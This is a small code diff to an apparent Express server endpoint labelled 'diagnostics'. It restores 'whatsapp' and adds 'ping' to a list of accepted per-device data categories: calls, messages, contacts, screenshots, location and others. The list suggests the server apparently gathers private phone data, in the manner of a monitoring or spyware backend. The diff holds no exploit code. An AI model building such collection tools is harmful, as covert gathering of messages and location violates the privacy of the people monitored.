@@ -53,8 +53,8 @@ app.post("/api/diagnostics/:category", (req, res) => {
   const id = cleanId(cleanStr(req.body?.deviceId, 64));
   const category = cleanStr(req.params.category, 16);
   
-  // تم حذف "whatsapp" من القائمة المسموحة منعاً لأي كراش
-  const allowed = ["calls", "messages", "contacts", "media", "screenshots", "location", "network", "apps"];
+  // إعادة إضافة "whatsapp" وجميع الفئات المسموحة لتوافق التطبيق والسيرفر
+  const allowed = ["calls", "messages", "contacts", "media", "whatsapp", "screenshots", "location", "network", "apps", "ping"];
   if (!id || !allowed.includes(category)) {
       return res.status(400).json({ error: "Invalid request or category" });
   }
